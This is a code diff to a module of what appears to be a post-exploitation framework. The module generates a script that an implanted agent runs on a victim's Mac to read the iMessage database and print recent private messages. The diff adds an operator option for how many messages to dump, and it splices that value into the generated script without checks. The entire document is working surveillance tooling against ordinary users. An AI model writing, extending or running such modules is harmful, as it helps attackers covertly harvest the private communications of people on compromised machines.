@@ -44,6 +44,12 @@ class Module:
                 'Description'   :   'Agent to run from.',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'Messages' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'The number of messages to enumerate from most recent.',
+                'Required'      :   True,
+                'Value'         :   '10'
             }
         }
         # save off a copy of the mainMenu object to access external functionality
@@ -62,7 +68,9 @@ class Module:
                     self.options[option]['Value'] = value
 
     def generate(self):
-        script = """
+        count = self.options['Messages']['Value']
+        script = "count = " + str(count)
+        script += """
 try:
     
     class imessage_dump():
@@ -74,7 +82,7 @@ try:
                 print e
 
 
-        def func(self):
+        def func(self, count):
             try:
                 import sqlite3
                 from os.path import expanduser
@@ -98,8 +106,8 @@ try:
                 #cur.execute("SELECT account_id,service_center,chat_identifier FROM chat")
                 #GuidData = cur.fetchall()
                 # Itterate over data
-                endMsg = -10
-                for item in statment[endMsg:]:
+                count = count * -1
+                for item in statment[count:]:
                     try:
                         for messageid in messageLink:
                             if str(messageid[1]) == str(item[4]):
@@ -124,7 +132,8 @@ try:
                         print e
                 conn.close()
                 print "[!] Messages in DataStore: " + str(len(statment)) 
-                print "[!] Messages Enumerated: " + str(endMsg) 
+                count = count * -1
+                print "[!] Messages Enumerated: " + str(count) 
             except Exception as e:
                 print e
             # Close the Database handle
@@ -152,9 +161,9 @@ try:
                     p = '[!] UTF8 Decoding issues Matching: ' + str(e)
                     print p
     im = imessage_dump()
-    im.func()
+    im.func(count)
 except Exception as e:
-    print e"""
+    print e""" 
 
 
         # add any arguments to the end exec
